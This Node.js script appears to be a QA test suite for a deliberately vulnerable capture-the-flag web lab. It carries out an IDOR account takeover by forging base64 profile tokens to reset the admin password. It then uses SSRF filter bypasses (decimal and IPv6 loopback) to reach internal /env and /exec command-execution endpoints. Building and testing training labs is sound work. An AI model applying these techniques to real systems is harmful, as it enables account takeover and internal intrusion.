#!/usr/bin/env node

const http = require('http');

const BASE_URL = 'http://localhost:3000';
const INTERNAL_URL = 'http://localhost:8181';

let results = {
    passed: 0,
    failed: 0,
    tests: []
};

// HTTP helper
function request(method, path, data = null, cookies = '') {
    return new Promise((resolve, reject) => {
        const url = new URL(path, BASE_URL);
        const options = {
            method,
            hostname: url.hostname,
            port: url.port,
            path: url.pathname + url.search,
            headers: {
                'Cookie': cookies,
                'Content-Type': 'application/x-www-form-urlencoded'
            }
        };

        if (data) {
            const body = new URLSearchParams(data).toString();
            options.headers['Content-Length'] = Buffer.byteLength(body);
        }

        const req = http.request(options, (res) => {
            let body = '';
            res.on('data', chunk => body += chunk);
            res.on('end', () => {
                const cookies = res.headers['set-cookie'] || [];
                resolve({ status: res.statusCode, body, headers: res.headers, cookies });
            });
        });

        req.on('error', reject);
        if (data) {
            req.write(new URLSearchParams(data).toString());
        }
        req.end();
    });
}

function extractCookie(cookies) {
    if (!cookies || !cookies.length) return '';
    return cookies.map(c => c.split(';')[0]).join('; ');
}

function test(name, result, detail = '') {
    const passed = !!result;
    results.tests.push({ name, passed, detail });
    if (passed) {
        results.passed++;
        console.log(`✅ ${name}`);
    } else {
        results.failed++;
        console.log(`❌ ${name}${detail ? ': ' + detail : ''}`);
    }
}

async function runTests() {
    console.log('\n🔍 Phase 7: QA & Difficulty Validation\n');
    console.log('='.repeat(60));

    // ========== IDOR VALIDATION ==========
    console.log('\n📋 IDOR Validation\n');

    // Login as existing resident user
    const loginRes = await request('POST', '/login', {
        username: 'juan_cruz',
        password: 'password123'
    });

    const residentCookie = extractCookie(loginRes.cookies);
    test('IDOR-01: Resident login works', loginRes.status === 302 && residentCookie.length > 0);

    // Test 1: Resident cannot access /admin
    const adminAccessTest = await request('GET', '/admin', null, residentCookie);
    test('IDOR-02: Resident blocked from /admin', adminAccessTest.status === 302 && !adminAccessTest.body.includes('Admin Dashboard'));

    // Test 2: Profile page renders ref token
    const profilePage = await request('GET', '/profile', null, residentCookie);
    const refMatch = profilePage.body.match(/name="ref" value="([^"]+)"/);
    test('IDOR-03: Profile page renders ref token', refMatch !== null);

    let residentRef = refMatch ? refMatch[1] : '';
    let decoded = null;
    try {
        decoded = JSON.parse(Buffer.from(residentRef, 'base64').toString('utf8'));
        test('IDOR-04: ref token base64-decodes to JSON', decoded && decoded.uid && decoded.role);
    } catch (e) {
        test('IDOR-04: ref token base64-decodes to JSON', false, e.message);
    }

    if (!decoded) {
        console.log('\n⚠️  Could not decode ref token, skipping dependent tests\n');
        return;
    }

    // Test 3: Self-update works normally
    const selfUpdate = await request('POST', '/profile/update', {
        ref: residentRef,
        full_name: 'Updated Name',
        address: 'Updated Address',
        password: '',
        confirm_password: ''
    }, residentCookie);
    test('IDOR-05: Self-update with own ref works', selfUpdate.status === 302);

    // Test 4: Craft ref for uid=47 (admin) and change password
    const adminRef = Buffer.from(JSON.stringify({ uid: 47, role: 'resident' })).toString('base64');
    const adminPwdUpdate = await request('POST', '/profile/update', {
        ref: adminRef,
        full_name: 'Compromised Admin',
        address: 'Pwned',
        password: 'Hacked123!',
        confirm_password: 'Hacked123!'
    }, residentCookie);
    test('IDOR-06: Crafted ref (uid=47) accepted without error', adminPwdUpdate.status === 302);

    // Test 5: No enumeration oracle - invalid uid returns same response
    const invalidRef = Buffer.from(JSON.stringify({ uid: 999, role: 'resident' })).toString('base64');
    const invalidUpdate = await request('POST', '/profile/update', {
        ref: invalidRef,
        full_name: 'Test',
        address: 'Test',
        password: ''
    }, residentCookie);
    test('IDOR-07: Invalid uid returns same redirect (no oracle)', invalidUpdate.status === 302);

    // Test 6: role field in ref has no effect (red herring)
    const roleRef = Buffer.from(JSON.stringify({ uid: decoded.uid, role: 'admin' })).toString('base64');
    const roleTest = await request('POST', '/profile/update', {
        ref: roleRef,
        full_name: 'Role Test',
        address: 'Test',
        password: ''
    }, residentCookie);
    const roleCheck = await request('GET', '/admin', null, residentCookie);
    test('IDOR-08: role tampering has no privilege effect', roleCheck.status === 302 && !roleCheck.body.includes('Admin Dashboard'));

    // Test 7: Login as admin with new password
    const adminLogin = await request('POST', '/login', {
        username: 'admin',
        password: 'Hacked123!'
    });
    const adminCookie = extractCookie(adminLogin.cookies);
    test('IDOR-09: Login as admin with changed password succeeds', adminLogin.status === 302);

    // Test 8: Admin access grants /admin and Flag 1
    const adminDashboard = await request('GET', '/admin', null, adminCookie);
    const hasFlag1 = adminDashboard.body.includes('BTF{') || adminDashboard.body.includes('FLAG');
    test('IDOR-10: Admin dashboard accessible and Flag 1 present', adminDashboard.status === 200 && hasFlag1);

    // ========== SSRF VALIDATION ==========
    console.log('\n📋 SSRF Validation\n');

    // Test 9: localhost blocked
    const localhostTest = await request('POST', '/admin/fetch-report', {
        url: 'http://localhost:8181/env'
    }, adminCookie);
    test('SSRF-01: localhost is blocked', localhostTest.body.includes('not allowed') || localhostTest.body.includes('security reasons'));

    // Test 10: 127.0.0.1 blocked
    const ipTest = await request('POST', '/admin/fetch-report', {
        url: 'http://127.0.0.1:8181/env'
    }, adminCookie);
    test('SSRF-02: 127.0.0.1 is blocked', ipTest.body.includes('not allowed') || ipTest.body.includes('security reasons'));

    // Test 11: Decimal IP bypass works
    const decimalIP = 2130706433; // 127.0.0.1 in decimal
    const decimalTest = await request('POST', '/admin/fetch-report', {
        url: `http://${decimalIP}:8181/env`
    }, adminCookie);
    const decimalSuccess = !(decimalTest.body.includes('not allowed') || decimalTest.body.includes('security reasons')) && 
                          (decimalTest.body.includes('Internal') || decimalTest.body.includes('PATH') || decimalTest.body.includes('flag'));
    test('SSRF-03: Decimal IP notation bypasses filter', decimalSuccess);

    // Test 12: IPv6 loopback bypass
    const ipv6Test = await request('POST', '/admin/fetch-report', {
        url: 'http://[::]:8181/env'
    }, adminCookie);
    test('SSRF-04: IPv6 loopback bypasses filter', !ipv6Test.body.includes('not allowed'));

    // Test 13: Internal /env returns Flag 2
    const hasFlag2 = decimalTest.body.includes('BTF{') || decimalTest.body.includes('FLAG') || decimalTest.body.includes('flag');
    test('SSRF-05: Internal /env returns Flag 2', hasFlag2);

    // Test 14: /exec endpoint accessible
    const execTest = await request('POST', '/admin/fetch-report', {
        url: `http://${decimalIP}:8181/exec?cmd=echo+test123`
    }, adminCookie);
    const hasExecOutput = execTest.body.includes('test123');
    test('SSRF-06: Internal /exec RCE endpoint works', hasExecOutput);

    // Test 15: Resident cannot access SSRF endpoint
    const residentSSRF = await request('POST', '/admin/fetch-report', {
        url: 'http://example.com'
    }, residentCookie);
    test('SSRF-07: SSRF endpoint blocked for non-admin', residentSSRF.status === 302 || residentSSRF.status === 403);

    // ========== GENERAL VALIDATION ==========
    console.log('\n📋 General Validation\n');

    // Test 16: Core features work
    const loginTest = await request('GET', '/login');
    test('GEN-01: Login page accessible', loginTest.status === 200);

    const logoutTest = await request('GET', '/logout', null, residentCookie);
    test('GEN-02: Logout works', logoutTest.status === 302);

    // Test 17: Breadcrumbs present
    const robotsTxt = await request('GET', '/robots.txt');
    test('GEN-03: robots.txt present', robotsTxt.status === 200 && robotsTxt.body.includes('/admin'));

    const changelog = await request('GET', '/CHANGELOG.md');
    test('GEN-04: CHANGELOG.md accessible', changelog.status === 200);

    // Test 18: No stack traces on error
    const errorTest = await request('GET', '/nonexistent');
    test('GEN-05: No stack traces on 404', !errorTest.body.includes('at ') && !errorTest.body.includes('Error:'));

    // Test 19: .git blocked or absent
    const gitTest = await request('GET', '/.git/config');
    test('GEN-06: .git/ blocked or absent', gitTest.status === 404 || gitTest.status === 403);

    // ========== SUMMARY ==========
    console.log('\n' + '='.repeat(60));
    console.log(`\n📊 Test Results: ${results.passed}/${results.passed + results.failed} passed\n`);

    if (results.failed > 0) {
        console.log('❌ Failed tests:');
        results.tests.filter(t => !t.passed).forEach(t => {
            console.log(`   - ${t.name}${t.detail ? ': ' + t.detail : ''}`);
        });
        console.log('');
    } else {
        console.log('✅ All tests passed! Lab is ready for deployment.\n');
    }

    process.exit(results.failed > 0 ? 1 : 0);
}

runTests().catch(err => {
    console.error('❌ Test suite error:', err.message);
    process.exit(1);
});
